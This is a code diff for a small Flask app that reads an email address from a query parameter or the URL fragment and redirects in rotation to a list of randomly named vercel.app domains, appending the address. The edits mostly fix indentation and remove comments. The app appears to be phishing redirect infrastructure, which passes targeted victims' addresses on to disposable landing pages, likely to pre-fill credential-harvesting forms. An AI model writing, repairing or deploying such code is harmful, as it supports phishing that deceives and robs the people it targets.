@@ -1,5 +1,4 @@
 from flask import Flask, redirect, request, render_template_string
-import os
 
 app = Flask(__name__)
 application = app
@@ -37,48 +36,41 @@ DOMAINS = [
     'https://srdytiyyyx4er75-res56r7tyycx6fgigc8-xi.vercel.app'
 ]
 
-# Initialize counter
 current_index = 0
 
 @app.route('/')
 def round_robin_balancer():
     global current_index
     
-    # Try to get email from query parameter first (?web=email@email.com)
     email = request.args.get('web', '')
     
-    # If no query parameter, serve a page that can handle the fragment
+    # If no query parameter, serve fragment handler page
     if not email:
-    return render_template_string('''
-        <div id="status"></div>
-        <script>
-            const status = document.getElementById('status');
+        return render_template_string('''
+            <div id="status"></div>
+            <script>
+                const status = document.getElementById('status');
     
-            if (window.location.hash) {
-                let email = window.location.hash.substring(1);
-                window.location.href = '/?web=' + encodeURIComponent(email);
-            } else {
-                status.innerText = 'Invalid email';
-            }
-        </script>
-    ''')
+                if (window.location.hash) {
+                    let email = window.location.hash.substring(1);
+                    window.location.href = '/?web=' + encodeURIComponent(email);
+                } else {
+                    status.innerText = 'Invalid email';
+                }
+            </script>
+        ''')
 
-    
-    # Basic email validation
-    if not email or '@' not in email or '.' not in email:
+    # Basic validation
+    if '@' not in email or '.' not in email:
         return "Invalid email.", 400
     
-    # Get next domain in round-robin sequence
+    # Round robin
     target_domain = DOMAINS[current_index]
-    
-    # Increment index for next request
     current_index = (current_index + 1) % len(DOMAINS)
     
-    # Construct target URL with the required ?web= parameter format
     target_url = f"{target_domain}/?web={email}"
     
-    # Instant redirect
     return redirect(target_url, code=302)
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run()
